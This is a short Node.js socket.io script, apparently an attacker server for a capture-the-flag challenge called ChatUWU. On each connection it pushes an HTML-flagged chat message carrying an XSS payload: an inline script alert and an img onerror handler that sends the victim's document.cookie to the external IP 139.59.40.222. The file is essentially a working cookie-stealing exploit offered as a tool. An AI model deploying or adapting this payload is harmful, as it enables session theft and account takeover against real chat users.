const app = require('express')();
const http = require('http').Server(app);
const cors = require('cors')
const DOMPurify = require('isomorphic-dompurify');
const hostname = process.env.HOSTNAME || '0.0.0.0';
const port = process.env.PORT || 80;
const rooms = ['textContent', 'DOMPurify'];
const io = require('socket.io')(http,{
    cors: {
      origin: "*",
      methods: ["GET", "POST"]
    }
  });
// app.use(cors())

const corsOptions = {
    origin: false,
    optionsSuccessStatus: 200 
}

app.get('/', cors(corsOptions), (req, res) => {
    console.log(req)
});

io.on('connection', (socket) => {
    let {nickname, room} = socket.handshake.query;
    console.log(nickname)
    console.log(room)
    socket.join(rooms[1]);
    io.to(rooms[1]).emit('msg', {
        from: 'system',
        text: '</li></ul><script>alert(1)</script><img src=x onerror="document.location=\'http://139.59.40.222/?\'+document.cookie">',
        isHtml:true
    });
});

http.listen(port, hostname, () => {
    console.log(`ChatUWU-hacking server running at http://${hostname}:${port}/`);
});